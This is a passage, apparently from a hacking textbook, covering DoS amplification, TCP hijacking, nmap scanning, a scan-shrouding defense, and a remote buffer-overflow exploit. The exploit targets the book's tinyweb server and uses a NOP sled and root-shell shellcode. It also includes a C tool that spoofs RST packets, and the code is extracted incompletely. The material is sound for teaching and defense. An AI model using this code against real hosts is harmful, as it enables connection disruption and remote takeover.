traffic from\nThere are actually some clever ways to perform a ping flood without using\nmassive amounts of bandwidth. An amplification attack uses spoofing and\nbroadcast addressing to amplify a single stream of packets by a hundred-fold.\nFirst, a target amplification system must be found. This is a network that\nallows communication to the broadcast address and has a relatively high\nnumber of active hosts. Then the attacker sends large ICMP echo request\npackets to the broadcast address of the amplification network, with a spoofed\nsource address of the victim\u2019s system. The amplifier will broadcast these packets\nto all the hosts on the amplification network, which will then send correspond-\ning ICMP echo reply packets to the spoofed source address (i.e., to the victim\u2019s\nThis amplification of traffic allows the attacker to send a relatively small\nstream of ICMP echo request packets out, while the victim gets swamped with\nup to a couple hundred times as many ICMP echo reply packets. This attack\ncan be done with both ICMP packets and UDP echo packets. These techniques\nare known as smurf and fraggle attacks, respectively.\nA distributed DoS (DDoS) attack is a distributed version of a flooding DoS\nattack. Since bandwidth consumption is the goal of a flooding DoS attack,\nthe more bandwidth the attacker is able to work with, the more damage they\ncan do. In a DDoS attack, the attacker first compromises a number of other\nhosts and installs daemons on them. Systems installed with such software are\ncommonly referred to as bots and make up what is known as a botnet. These\nbots wait patiently until the attacker picks a victim and decides to attack. The\nattacker uses some sort of a controlling program, and all of the bots simulta-\nneously attack the victim with some form of flooding DoS attack. Not only\ndoes the great number of distributed hosts multiply the effect of the flood-\ning, this also makes tracing the attack source much more difficult.\nTCP/IP hijacking is a clever technique that uses spoofed packets to take over a\nconnection between a victim and a host machine. This technique is exception-\nally useful when the victim uses a one-time password to connect to the host\nmachine. A one-time password can be used to authenticate once and only once,\nwhich means that sniffing the authentication is useless for the attacker.\nTo carry out a TCP/IP hijacking attack, the attacker must be on the same\nnetwork as the victim. By sniffing the local network segment, all of the details\nof open TCP connections can be pulled from the headers. As we have seen,\neach TCP packet contains a sequence number in its header. This sequence\nnumber is incremented with each packet sent to ensure that packets are\nreceived in the correct order. While sniffing, the attacker has access to the\nsequence numbers for a connection between a victim (system A in the follow-\ning illustration) and a host machine (system B). Then the attacker sends a\nspoofed packet from the victim\u2019s IP address to the host machine, using the\nsniffed sequence number to provide the proper acknowledgment number,\nThe host machine will receive the spoofed packet with the correct\nacknowledgment number and will have no reason to believe it didn\u2019t come\nA very simple form of TCP/IP hijacking involves injecting an authentic-looking\nreset (RST) packet. If the source is spoofed and the acknowledgment number\nis correct, the receiving side will believe that the source actually sent the reset\nImagine a program to perform this attack on a target IP. At a high level,\nit would sniff using libpcap, then inject RST packets using libnet. Such a\nprogram doesn\u2019t need to look at every packet but only at established TCP\nconnections to the target IP. Many other programs that use libpcap also don\u2019t\nneed to look at every single packet, so libpcap provides a way to tell the kernel\nto only send certain packets that match a filter. This filter, known as a Berkeley\nPacket Filter (BPF), is very similar to a program. For example, the filter rule\nto filter for a destination IP of 192.168.42.88 is \"dst host 192.168.42.88\". Like\na program, this rule consists of keyword and must be compiled before it\u2019s\nactually sent to the kernel. The tcpdump program uses BPFs to filter what it\ncaptures; it also provides a mode to dump the filter program.\nreader@hacking:~/booksrc $ sudo tcpdump -d \"dst host 192.168.42.88\"\nreader@hacking:~/booksrc $ sudo tcpdump -ddd \"dst host 192.168.42.88\"\nAfter the filter rule is compiled, it can be passed to the kernel for filter-\ning. Filtering for established connections is a bit more complicated. All\nestablished connections will have the ACK flag set, so this is what we should\nlook for. The TCP flags are found in the 13th octet of the TCP header. The\nflags are found in the following order, from left to right: URG, ACK, PSH,\nRST, SYN, and FIN. This means that if the ACK flag is turned on, the 13th\noctet would be 00010000 in binary, which is 16 in decimal. If both SYN and\nACK are turned on, the 13th octet would be 00010010 in binary, which is 18\nIn order to create a filter that matches when the ACK flag is turned on\nwithout caring about any of the other bits, the bitwise AND operator is used.\nANDing 00010010 with 00010000 will produce 00010000, since the ACK bit is the\nonly bit where both bits are 1. This means that a filter of tcp[13] & 16 == 16\nwill match the packets where the ACK flag is turned on, regardless of the\nThis filter rule can be rewritten using named values and inverted logic as\ntcp[tcpflags] & tcp-ack != 0. This is easier to read but still provides the same\nresult. This rule can be combined with the previous destination IP rule using\nreader@hacking:~/booksrc $ sudo tcpdump -nl \"tcp[tcpflags] & tcp-ack != 0 and dst host\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes\n10:19:47.567378 IP 192.168.42.72.40238 > 192.168.42.88.22: . ack 2777534975 win 92\n10:19:47.770276 IP 192.168.42.72.40238 > 192.168.42.88.22: . ack 22 win 92 <nop,nop,timestamp\n10:19:47.770322 IP 192.168.42.72.40238 > 192.168.42.88.22: P 0:20(20) ack 22 win 92\n10:19:47.771536 IP 192.168.42.72.40238 > 192.168.42.88.22: P 20:732(712) ack 766 win 115\n10:19:47.918866 IP 192.168.42.72.40238 > 192.168.42.88.22: P 732:756(24) ack 766 win 115\nA similar rule is used in the following program to filter the packets\nlibpcap sniffs. When the program gets a packet, the header information is\nused to spoof a RST packet. This program will be explained as it\u2019s listed.\nvoid caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);\nchar errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE\ntarget_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);\npcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);\ncritical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);\nlibnet_error(LIBNET_ERR_FATAL, \"can't open network interface.  -- this program must run\nlibnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));\nlibnet_error(LIBNET_ERR_FATAL, \"can't initialize packet memory.\\n\");\nset_packet_filter(pcap_handle, (struct in_addr *)&target_ip);\nprintf(\"Resetting all TCP connections to %s on %s\\n\", argv[1], device);\npcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);\nThe majority of this program should make sense to you. In the beginning,\na data_pass structure is defined, which is used to pass data through the libpcap\ncallback. libnet is used to open a raw socket interface and to allocate packet\nmemory. The file descriptor for the raw socket and a pointer to the packet\nmemory will be needed in the callback function, so this critical libnet data is\nstored in its own structure. The final argument to the pcap_loop() call is user\npointer, which is passed directly to the callback function. By passing a pointer\nto the critical_libnet_data structure, the callback function will have access to\neverything in this structure. Also, the snap length value used in pcap_open_live()\nhas been reduced from 4096 to 128, since the information needed from the\n/* Sets a packet filter to look for established TCP connections to target_ip */\nint set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip) {\nsprintf(filter_string, \"tcp[tcpflags] & tcp-ack != 0 and dst host %s\", inet_ntoa(*target_ip));\nprintf(\"DEBUG: filter string is \\'%s\\'\\n\", filter_string);\nif(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)\nThe next function compiles and sets the BPF to only accept packets from\nestablished connections to the target IP. The sprintf() function is just a printf()\nvoid caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char\npassed = (struct data_pass *) user_args; // Pass data using a pointer to a struct.\nIPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);\nTCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);\ninet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));\ninet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));\nlibnet_build_ip(LIBNET_TCP_H,      // Size of the packet sans IP header\nlibnet_get_prand(LIBNET_PRu16), // IP ID (randomized)\nlibnet_get_prand(LIBNET_PR8),   // TTL (randomized)\nIPPROTO_TCP,                    // Transport protocol\n*((u_long *)&(IPhdr->ip_dst)),  // Source IP (pretend we are dst)\n*((u_long *)&(IPhdr->ip_src)),  // Destination IP (send back to src)\npassed->packet);                // Packet header memory\nlibnet_build_tcp(htons(TCPhdr->th_dport), // Source TCP port (pretend we are dst)\nhtons(TCPhdr->th_sport),        // Destination TCP port (send back to src)\nhtonl(TCPhdr->th_ack),          // Sequence number (use previous ack)\nlibnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)\nTH_RST,                         // Control flags (RST flag set only)\nlibnet_get_prand(LIBNET_PRu16), // Window size (randomized)\n(passed->packet) + LIBNET_IP_H);// Packet header memory\nif (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)\nlibnet_error(LIBNET_ERR_FATAL, \"can't compute checksum\\n\");\nbcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IP_H+LIBNET_TCP_H);\nlibnet_error(LIBNET_ERR_WARNING, \"Warning: Incomplete packet written.\");\nThe callback function spoofs the RST packets. First, the critical libnet data\nis retrieved, and pointers to the IP and TCP headers are set using the structures\nincluded with libnet. We could use our own structures from hacking-network.h,\nbut the libnet structures are already there and compensate for the host\u2019s\nbyte ordering. The spoofed RST packet uses the sniffed source address as\nthe destination, and vice versa. The sniffed sequence number is used as the\nspoofed packet\u2019s acknowledgment number, since that is what is expected.\nreader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o rst_hijack rst_hijack.c -lnet -lpcap\nreader@hacking:~/booksrc $ sudo ./rst_hijack 192.168.42.88\nDEBUG: filter string is 'tcp[tcpflags] & tcp-ack != 0 and dst host 192.168.42.88'\nResetting all TCP connections to 192.168.42.88 on eth0\nresetting TCP connection from 192.168.42.72:47783 <---> 192.168.42.88:22\nThe spoofed packet doesn\u2019t need to be an RST packet. This attack becomes\nmore interesting when the spoof packet contains data. The host machine\nreceives the spoofed packet, increments the sequence number, and responds\nto the victim\u2019s IP. Since the victim\u2019s machine doesn\u2019t know about the spoofed\npacket, the host machine\u2019s response has an incorrect sequence number, so\nthe victim ignores that response packet. And since the victim\u2019s machine\nignored the host machine\u2019s response packet, the victim\u2019s sequence number\ncount is off. Therefore, any packet the victim tries to send to the host machine\nwill have an incorrect sequence number as well, causing the host machine\nto ignore it. In this case, both legitimate sides of the connection have\nincorrect sequence numbers, resulting in a desynchronized state. And since\nthe attacker sent out the first spoofed packet that caused all this chaos, it can\nkeep track of sequence numbers and continue spoofing packets from the\nvictim\u2019s IP address to the host machine. This lets the attacker continue com-\nmunicating with the host machine while the victim\u2019s connection hangs.\nPort scanning is a way of figuring out which ports are listening and accepting\nconnections. Since most services run on standard, documented ports, this\ninformation can be used to determine which services are running. The simpl-\nest form of port scanning involves trying to open TCP connections to every\npossible port on the target system. While this is effective, it\u2019s also noisy and\ndetectable. Also, when connections are established, services will normally log\nthe IP address. To avoid this, several clever techniques have been invented.\nA port scanning tool called nmap, written by Fyodor, implements all of\nthe following port-scanning techniques. This tool has become one of the most\nA SYN scan is also sometimes called a half-open scan. This is because it doesn\u2019t\nactually open a full TCP connection. Recall the TCP/IP handshake: When a\nfull connection is made, first a SYN packet is sent, then a SYN/ACK packet is\nsent back, and finally an ACK packet is returned to complete the handshake\nand open the connection. A SYN scan doesn\u2019t complete the handshake, so a\nfull connection is never opened. Instead, only the initial SYN packet is sent,\nand the response is examined. If a SYN/ACK packet is received in response,\nthat port must be accepting connections. This is recorded, and an RST packet\nis sent to tear down the connection to prevent the service from accidentally\nUsing nmap, a SYN scan can be performed using the command-line\noption -sS. The program must be run as root, since the program isn\u2019t using\nreader@hacking:~/booksrc $ sudo nmap -sS 192.168.42.72\nStarting Nmap 4.20 ( http://insecure.org ) at 2007-05-29 09:19 PDT\nNmap finished: 1 IP address (1 host up) scanned in 0.094 seconds\nIn response to SYN scanning, new tools to detect and log half-open connections\nwere created. So yet another collection of techniques for stealth port scanning\nevolved: FIN, X-mas, and Null scans. These all involve sending a nonsensical\npacket to every port on the target system. If a port is listening, these packets\njust get ignored. However, if the port is closed and the implementation follows\nprotocol (RFC 793), an RST packet will be sent. This difference can be used\nto detect which ports are accepting connections, without actually opening\nThe FIN scan sends a FIN packet, the X-mas scan sends a packet with\nFIN, URG, and PUSH turned on (so named because the flags are lit up like a\nChristmas tree), and the Null scan sends a packet with no TCP flags set. While\nthese types of scans are stealthier, they can also be unreliable. For instance,\nMicrosoft\u2019s implementation of TCP doesn\u2019t send RST packets like it should,\nUsing nmap, FIN, X-mas, and NULL scans can be performed using the\ncommand-line options -sF, -sX, and -sN, respectively. Their output looks\nAnother way to avoid detection is to hide among several decoys. This technique\nsimply spoofs connections from various decoy IP addresses in between each\nreal port-scanning connection. The responses from the spoofed connections\naren\u2019t needed, since they are simply misleads. However, the spoofed decoy\naddresses must use real IP addresses of live hosts; otherwise, the target may\nDecoys can be specified in nmap with the -D command-line option.\nThe sample nmap command shown below scans the IP 192.168.42.72, using\nreader@hacking:~/booksrc $ sudo nmap -D 192.168.42.10,192.168.42.11 192.168.42.72\nIdle scanning is a way to scan a target using spoofed packets from an idle\nhost, by observing changes in the idle host. The attacker needs to find a\nusable idle host that is not sending or receiving any other network traffic and\nthat has a TCP implementation that produces predictable IP IDs that change\nby a known increment with each packet. IP IDs are meant to be unique per\npacket per session, and they are commonly incremented by a fixed amount.\nPredictable IP IDs have never really been considered a security risk, and idle\nscanning takes advantage of this misconception. Newer operating systems,\nsuch as the recent Linux kernel, OpenBSD, and Windows Vista, randomize\nthe IP ID, but older operating systems and hardware (such as printers)\nFirst, the attacker gets the current IP ID of the idle host by contacting it\nwith a SYN packet or an unsolicited SYN/ACK packet and observing the IP\nID of the response. By repeating this process a few more times, the incre-\nment applied to the IP ID with each packet can be determined.\nThen, the attacker sends a spoofed SYN packet with the idle host\u2019s IP\naddress to a port on the target machine. One of two things will happen,\ndepending on whether that port on the victim machine is listening:\n\u0000If that port is listening, a SYN/ACK packet will be sent back to the idle\nhost. But since the idle host didn\u2019t actually send out the initial SYN\npacket, this response appears to be unsolicited to the idle host, and it\n\u0000If that port isn\u2019t listening, the target machine doesn\u2019t send a SYN/ACK\npacket back to the idle host, so the idle host doesn\u2019t respond.\nAt this point, the attacker contacts the idle host again to determine how\nmuch the IP ID has incremented. If it has only incremented by one interval,\nno other packets were sent out by the idle host between the two checks. This\nimplies that the port on the target machine is closed. If the IP ID has incre-\nmented by two intervals, one packet, presumably an RST packet, was sent out\nby the idle machine between the checks. This implies that the port on the\nThe steps are illustrated on the next page for both possible outcomes.\nOf course, if the idle host isn\u2019t truly idle, the results will be skewed. If\nthere is light traffic on the idle host, multiple packets can be sent for each\nport. If 20 packets are sent, then a change of 20 incremental steps should be\nan indication of an open port, and none, of a closed port. Even if there is\nlight traffic, such as one or two non\u2013scan-related packets sent by the idle\nhost, this difference is large enough that it can still be detected.\nIf this technique is used properly on an idle host that doesn\u2019t have any\nlogging capabilities, the attacker can scan any target without ever revealing\nAfter finding a suitable idle host, this type of scanning can be done with\nnmap using the -sI command-line option followed by the idle host\u2019s address:\nreader@hacking:~/booksrc $ sudo nmap -sI idlehost.com 192.168.42.7\nPort scans are often used to profile systems before they are attacked. Know-\ning what ports are open allows an attacker to determine which services can\nbe attacked. Many IDSs offer methods to detect port scans, but by then the\ninformation has already been leaked. While writing this chapter, I wondered\nif it is possible to prevent port scans before they actually happen. Hacking,\nreally, is all about coming up with new ideas, so a newly developed method\nfor proactive port-scanning defense will be presented here.\nFirst of all, the FIN, Null, and X-mas scans can be prevented by a simple\nkernel modification. If the kernel never sends reset packets, these scans will\nturn up nothing. The following output uses grep to find the kernel code\nreader@hacking:~/booksrc $ grep -n -A 20 \"void.*send_reset\" /usr/src/linux/net/ipv4/tcp_ipv4.c\n547:static void tcp_v4_send_reset(struct sock *sk, struct sk_buff *skb)\n553-            __be32 opt[(TCPOLEN_MD5SIG_ALIGNED >> 2)];\nreturn; // Modification: Never send RST, always return.\n561-    /* Never send a reset in response to a reset. */\n565-    if (((struct rtable *)skb->dst)->rt_type != RTN_LOCAL)\nBy adding the return command (shown above in bold), the\ntcp_v4_send_reset() kernel function will simply return instead of doing\nanything. After the kernel is recompiled, the resulting kernel won\u2019t send\nStarting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2007-03-17 16:58 PDT\nNmap finished: 1 IP address (1 host up) scanned in 1.462 seconds\nStarting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2007-03-17 16:58 PDT\nNmap finished: 1 IP address (1 host up) scanned in 1.462 seconds\nThis works fine for scans that rely on RST packets, but preventing infor-\nmation leakage with SYN scans and full-connect scans is a bit more difficult.\nIn order to maintain functionality, open ports have to respond with SYN/ACK\npackets\u2014there is no way around that. But if all of the closed ports also\nresponded with SYN/ACK packets, the amount of useful information an\nattacker could retrieve from port scans would be minimized. Simply opening\nevery port would cause a major performance hit, though, which isn\u2019t desirable.\nIdeally, this should all be done without using a TCP stack. The following pro-\ngram does exactly that. It\u2019s a modification of the rst_hijack.c program, using\na more complex BPF string to filter only SYN packets destined for closed ports.\nThe callback function spoofs a legitimate looking SYN/ACK response to any\nSYN packet that makes it through the BPF. This will flood port scanners with\na sea of false positives, which will hide legitimate ports.\nvoid caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);\nint set_packet_filter(pcap_t *, struct in_addr *, u_short *);\nchar errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE\nprintf(\"Limited to tracking %d existing ports.\\n\", MAX_EXISTING_PORTS);\nprintf(\"Usage: %s <IP to shroud> [existing ports...]\\n\", argv[0]);\ntarget_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);\npcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);\ncritical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);\nlibnet_error(LIBNET_ERR_FATAL, \"can't open network interface.  -- this program must run\nlibnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));\nlibnet_error(LIBNET_ERR_FATAL, \"can't initialize packet memory.\\n\");\nset_packet_filter(pcap_handle, (struct in_addr *)&target_ip, existing_ports);\npcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);\n/* Sets a packet filter to look for established TCP connections to target_ip */\nint set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip, u_short *ports) {\nchar *str_ptr, filter_string[90 + (25 * MAX_EXISTING_PORTS)];\nsprintf(filter_string, \"dst host %s and \", inet_ntoa(*target_ip)); // Target IP\nstrcat(filter_string, \"tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0\");\nif(ports[0] != 0) { // If there is at least one existing port\nif(ports[1] == 0) // There is only one existing port\nsprintf(str_ptr, \" and not dst port %hu\", ports[i]);\nsprintf(str_ptr, \" and not (dst port %hu\", ports[i++]);\nprintf(\"DEBUG: filter string is \\'%s\\'\\n\", filter_string);\nif(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)\nvoid caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char\npassed = (struct data_pass *) user_args; // Pass data using a pointer to a struct\nIPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);\nTCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);\nlibnet_build_ip(LIBNET_TCP_H,      // Size of the packet sans IP header\nlibnet_get_prand(LIBNET_PRu16), // IP ID (randomized)\nlibnet_get_prand(LIBNET_PR8),   // TTL (randomized)\nIPPROTO_TCP,                    // Transport protocol\n*((u_long *)&(IPhdr->ip_dst)),  // Source IP (pretend we are dst)\n*((u_long *)&(IPhdr->ip_src)),  // Destination IP (send back to src)\npassed->packet);                // Packet header memory\nlibnet_build_tcp(htons(TCPhdr->th_dport),// Source TCP port (pretend we are dst)\nhtons(TCPhdr->th_sport),        // Destination TCP port (send back to src)\nhtonl(TCPhdr->th_ack),          // Sequence number (use previous ack)\nhtonl((TCPhdr->th_seq) + 1),    // Acknowledgement number (SYN's seq # + 1)\nTH_SYN | TH_ACK,                // Control flags (RST flag set only)\nlibnet_get_prand(LIBNET_PRu16), // Window size (randomized)\n(passed->packet) + LIBNET_IP_H);// Packet header memory\nif (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)\nlibnet_error(LIBNET_ERR_FATAL, \"can't compute checksum\\n\");\nbcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IP_H+LIBNET_TCP_H);\nlibnet_error(LIBNET_ERR_WARNING, \"Warning: Incomplete packet written.\");\nThere are a few tricky parts in the code above, but you should be able to\nfollow all of it. When the program is compiled and executed, it will shroud the\nIP address given as the first argument, with the exception of a list of existing\nreader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o shroud shroud.c -lnet -lpcap\nreader@hacking:~/booksrc $ sudo ./shroud 192.168.42.72 22 80\nDEBUG: filter string is 'dst host 192.168.42.72 and tcp[tcpflags] & tcp-syn != 0 and\ntcp[tcpflags] & tcp-ack = 0 and not (dst port 22 or dst port 80)'\nWhile shroud is running, any port scanning attempts will show every port\nNmap run completed -- 1 IP address (1 host up) scanned in 37 seconds\nThe only service that is actually running is ssh on port 22, but it is hidden\nin a sea of false positives. A dedicated attacker could simply telnet to every\nport to check the banners, but this technique could easily be expanded to\nNetwork programming tends to move many chunks of memory around and is\nheavy in typecasting. You\u2019ve seen for yourself how crazy some of the typecasts\ncan get. Mistakes thrive in this type of chaos. And since many network pro-\ngrams need to run as root, these little mistakes can become critical vulner-\nabilities. One such vulnerability exists in the code from this chapter. Did you\n/* This function accepts a socket FD and a ptr to a destination\n* buffer.  It will receive from the socket until the EOL byte\n* sequence in seen.  The EOL bytes are read from the socket, but\n* the destination buffer is terminated before these bytes.\n* Returns the size of the read line (without EOL bytes).\nint recv_line(int sockfd, unsigned char *dest_buffer) {\nwhile(recv(sockfd, ptr, 1, 0) == 1) { // Read a single byte.\nif(*ptr == EOL[eol_matched]) { // Does this byte match terminator?\nif(eol_matched == EOL_SIZE) { // If all bytes match terminator,\nreturn strlen(dest_buffer); // Return bytes recevied.\nreturn 0; // Didn't find the end-of-line characters.\nThe recv_line() function in hacking-network.h has a small mistake of\nomission\u2014there is no code to limit the length. This means received bytes\ncan overflow if they exceed the dest_buffer size. The tinyweb server program\nand any other programs that use this function are vulnerable to attack.\nTo exploit the vulnerability in the tinyweb.c program, we just need to send\npackets that will strategically overwrite the return address. First, we need to\nknow the offset from the start of a buffer we control to the stored return\naddress. Using GDB, we can analyze the compiled program to find this;\nhowever, there are some subtle details that can cause tricky problems. For\nexample, the program requires root privileges, so the debugger must be run\nas root. But using sudo or running with root\u2019s environment will change the\nstack, meaning the addresses seen in the debugger\u2019s run of the binary won\u2019t\nmatch the addresses when it\u2019s running normally. There are other slight\ndifferences that can shift memory around in the debugger like this, creating\ninconsistencies that can be maddening to track down. According to the\ndebugger, everything will look like it should work; however, the exploit fails\nwhen run outside the debugger, since the addresses are different.\nOne elegant solution to this problem is to attach to the process after it\u2019s\nalready running. In the output below, GDB is used to attach to an already-\nrunning tinyweb process that was started in another terminal. The source is\nrecompiled using the -g option to include debugging symbols that GDB\nroot     13019  0.0  0.0   1504   344 pts/0    S+   20:25   0:00 ./tinyweb\nreader   13104  0.0  0.0   2880   748 pts/2    R+   20:27   0:00 grep tinyweb\nreader@hacking:~/booksrc $ sudo gdb -q --pid=13019 --symbols=./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n/cow/home/reader/booksrc/tinyweb: No such file or directory.\nA program is being debugged already.  Kill it? (y or n) n\n43            sin_size = sizeof(struct sockaddr_in);\n44            new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n48            handle_connection(new_sockfd, &client_addr);\n53      /* This function handles the connection on the passed socket from the\n54       * passed client address.  The connection is processed as a web request\n55       * and this function replies over the connected socket.  Finally, the\n56       * passed socket is closed at the end of the function.\n58      void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\n59         unsigned char *ptr, request[500], resource[500];\nBreakpoint 1 at 0x8048d02: file tinyweb.c, line 62.\nAfter attaching to the running process, a stack backtrace shows the pro-\ngram is currenty in main(), waiting for a connection. After setting a breakpoint\nat the first recv_line() call on line 62 (\u0000), the program is allowed to continue.\nAt this point, the program\u2019s execution must be advanced by making a web\nrequest using wget in another terminal or a browser. Then the breakpoint in\nBreakpoint 2, handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62\n#0  handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62\n0xbffff7b4:     0xb7fd5ff4      0xb8000ce0      0x00000000      0xbffff848\n0xbffff7c4:     0xb7ff9300      0xb7fd5ff4      0xbffff7e0      0xb7f691c0\n0xbffff7d4:     0xb7fd5ff4      0xbffff848      0x08048cf6      0x00000004\n0xbffff7e4:     0xbffff810      0xbffff80c      0xbffff834      0x00000004\nThe program is running.  Quit anyway (and detach it)? (y or n) y\nAt the breakpoint, the request buffer begins at 0xbfffff5c0. The bt com-\nmand\u2019s stack backtrace shows that the return address from handle_connection()\nis 0x08048cf6. Since we know how the local variables are generally laid out on\nthe stack, we know the request buffer is near the end of the frame. This means\nthat the stored return address should be on the stack somewhere near the\nend of this 500-byte buffer. Since we already know the general area to look, a\nquick inspection shows the stored return address is at 0xbffff7dc (\u0000). A little\nmath shows the stored return address is 540 bytes from the start of the request\nbuffer. However, there are a few bytes near the beginning of the buffer that\nmight be mangled by the rest of the function. Remember, we don\u2019t gain\ncontrol of the program until the function returns. To account for this, it\u2019s\nbest to just avoid the beginning of the buffer. Skipping the first 200 bytes\nshould be safe, while leaving plenty of space for shellcode in the remaining\n300 bytes. This means 0xbffff688 is the target return address.\nThe following exploit for the tinyweb program uses the offset and return\naddress overwrite values calculated with GDB. It fills the exploit buffer with\nnull bytes, so anything written into it will automatically be null-terminated.\nThen it fills the first 540 bytes with NOP instructions. This builds the NOP\nsled and fills the buffer up to the return address overwrite location. Then\nthe entire string is terminated with the '\\r\\n' line terminator.\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\ntarget_addr.sin_addr = *((struct in_addr *)host_info->h_addr);\nmemset(&(target_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)\nbzero(buffer, 600);                      // Zero out the buffer.\nmemset(buffer, '\\x90', OFFSET);          // Build a NOP sled.\n*((u_int *)(buffer + OFFSET)) = RETADDR; // Put the return address in\nmemcpy(buffer+300, shellcode, strlen(shellcode)); // shellcode.\nstrcat(buffer, \"\\r\\n\");                  // Terminate the string.\ndump(buffer, strlen(buffer));  // Show the exploit buffer.\nsend_string(sockfd, buffer);   // Send exploit buffer as an HTTP request.\nWhen this program is compiled, it can remotely exploit hosts running\nthe tinyweb program, tricking them into running the shellcode. The exploit\nalso dumps out the bytes of the exploit buffer before it sends it. In the output\nbelow, the tinyweb program is run in a different terminal, and the exploit is\ntested against it. Here\u2019s the output from the attacker\u2019s terminal:\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 31 c0 31 db | ............1.1.\n31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 2f 2f 73 68 | 1......j.XQh//sh\n68 2f 62 69 6e 89 e3 51 89 e2 53 89 e1 cd 80 90 | h/bin..Q..S.....\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 88 f6 ff bf | ................\n0d 0a                                           | ..\nBack on the terminal running the tinyweb program, the output shows the\nexploit buffer was received and the shellcode is executed. This will provide a\nrootshell, but only for the console running the server. Unfortunately, we aren\u2019t\nat the console, so this won\u2019t do us any good. At the server console, we 